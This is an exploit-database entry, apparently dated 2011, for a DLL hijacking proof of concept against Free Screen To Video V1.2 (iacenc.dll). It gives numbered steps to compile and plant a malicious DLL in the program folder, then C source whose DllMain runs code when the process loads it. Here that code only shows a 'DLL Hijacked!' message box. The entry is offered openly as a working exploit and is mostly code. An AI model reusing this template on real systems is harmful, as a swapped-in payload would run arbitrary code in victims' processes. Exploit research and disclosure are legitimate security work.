id: 15618
date: 03/17/2011
title: Free Screen To Video V1.2 DLL Hijacking Exploit (iacenc.dll)
author: Metropolis
cves: 

/*
# Exploit Title: Free Screen To Video V1.2 DLL Hijacking Exploit (iacenc.dll)
# Date: 15/03/2011
# Author: Metropolis
# Url: http://metropolis.fr.cr
# Software Link: http://www.koyotesoft.com/appli/Setup_FreeScreenVideo.exe
# Version: V1.2
# Tested on: Microsoft Windows XP Professional SP3 (FR)
# Instructions:
# 1. Compile dll  
# gcc -shared -o iacenc.dll FreeScreenVideo.c
# 2. Add iacenc.dl
# C:\Program Files\Free Screen To Video
# 3. Launch FreeScreenVideo.exe
# 4. MessageBox DLL Hijacked! 
*/
#include <windows.h>
 
BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
 
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
        dll_mll();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
        break;
    }
 
    return TRUE;
}
 
int dll_mll()
{
    MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}



#  0day.today [2023-03-27]  #